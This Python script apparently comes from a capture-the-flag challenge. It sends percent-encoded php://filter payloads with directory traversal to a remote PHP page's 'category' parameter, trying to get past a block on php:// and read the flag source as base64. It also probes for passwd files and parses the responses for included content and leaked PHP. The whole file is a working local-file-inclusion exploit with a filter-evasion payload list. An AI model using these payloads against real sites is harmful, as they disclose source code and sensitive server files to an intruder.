"""Round 6: try encoding-based bypass of the php:// block."""
import re
import urllib.request

BASE = "http://noctf.fa1lsnow.com:40547/index.php?category="

# raw query strings (already percent-encoded where intended)
PAYLOADS = [
    "%70hp://filter/convert.base64-encode/resource=woofers/../flag",
    "ph%70://filter/convert.base64-encode/resource=woofers/../flag",
    "php%3a%2f%2ffilter/convert.base64-encode/resource=woofers/../flag",
    "php%3A%2F%2Ffilter/convert.base64-encode/resource=woofers/../flag",
    "%70%68%70://filter/convert.base64-encode/resource=woofers/../flag",
    "passwd",
    "xxpasswdxx",
    "woofers/passwd",
]


def fetch(qs):
    url = BASE + qs
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


for qs in PAYLOADS:
    status, body = fetch(qs)
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:400]
        if "Sorry" in body:
            note += " [SORRY]"
        if "Warning" in body:
            wm = re.search(r"include\([^)]{0,160}", body)
            note += " [WARN: " + (wm.group(0) if wm else "?") + "]"
        # look for base64 of php tag
        if "PD9waHA" in body or "PD9waHA" in note:
            note += " [*** BASE64 PHP TAG FOUND ***]"
    print(f"[{status}] {qs!r}\n      {note}\n")
